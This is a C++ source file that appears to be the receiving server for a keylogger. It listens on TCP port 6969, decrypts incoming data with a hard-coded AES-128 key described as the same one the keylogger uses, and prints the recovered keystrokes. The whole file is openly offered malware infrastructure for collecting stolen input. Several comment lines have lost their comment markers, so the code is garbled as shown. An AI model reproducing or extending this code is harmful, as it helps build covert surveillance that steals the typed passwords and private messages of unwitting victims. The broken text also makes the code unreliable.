#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <openssl/aes.h>

using namespace std;

 AES Key (same as in keylogger)
unsigned char aes_key[] = {
    0x62, 0x61, 0x74, 0x6D, 0x61, 0x6E, 0x6B, 0x6E,
    0x69, 0x67, 0x68, 0x74, 0x66, 0x61, 0x6C, 0x6C
};

void decryptAes(const unsigned char* cipherText, size_t cipherTextLen, unsigned char* plainText) {
    AES_KEY dec_key;
    AES_set_decrypt_key(aes_key, 128, &dec_key); 

    size_t blocks = cipherTextLen / AES_BLOCK_SIZE;
    for (size_t i = 0; i < blocks; i++) {
        AES_ecb_encrypt(cipherText + (i * AES_BLOCK_SIZE), plainText + (i * AES_BLOCK_SIZE), &dec_key, AES_DECRYPT);
    }
}

int main() {
    int socket_desc, client_sock, c, read_size;
    struct sockaddr_in server, client;
    char client_message[2000];
    unsigned char decryptedText[2000];

     Create socket
    socket_desc = socket(AF_INET, SOCK_STREAM, 0);
    if (socket_desc == -1) {
        cout << "Could not create socket" << endl;
    }
    cout << "Socket created" << endl;
     
     Prepare the sockaddr_in structure
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(6969); 

     Bind
    if (bind(socket_desc, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("bind failed. Error");
        return 1;
    }
    cout << "Bind done" << endl;

     Listen
    listen(socket_desc, 3);
     
     Accept an incoming connection
    cout << "Waiting for incoming connections..." << endl;
    c = sizeof(struct sockaddr_in);

     Accept connection from an incoming client
    client_sock = accept(socket_desc, (struct sockaddr *)&client, (socklen_t*)&c);
    if (client_sock < 0) {
        perror("accept failed");
        return 1;
    }
    cout << "Connection accepted" << endl;

     Receive a message from client
    while ((read_size = recv(client_sock, client_message, 2000, 0)) > 0) {
         Decrypt received data
        memset(decryptedText, 0, sizeof(decryptedText)); 
        decryptAes((unsigned char*)client_message, read_size, decryptedText);

         Print decrypted text
        cout << "Decrypted Data: " << decryptedText << endl;
    }
     
    if (read_size == 0) {
        cout << "Client disconnected" << endl;
       
flush(cout);
} else if (read_size == -1) {
perror("recv failed");
}
close(socket_desc);
close(client_sock);

return 0;
}